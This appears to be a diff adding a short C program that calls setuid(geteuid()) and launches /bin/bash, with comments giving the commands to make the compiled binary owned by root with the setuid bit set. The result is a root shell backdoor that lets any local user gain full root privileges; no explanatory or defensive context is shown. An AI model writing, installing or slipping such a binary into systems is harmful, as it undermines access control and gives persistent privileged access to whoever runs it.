@@ -1,0 +1,15 @@
+#include <stdio.h>
+#include <stdlib.h>
+#include <unistd.h>
+
+int main(int argc,char* argv[]){
+	
+	setuid(geteuid());
+	system("/bin/bash");
+
+    return 0;
+}
+
+// COMMANDS
+// sudo chown root a.out
+// sudo chmod u+s a.out
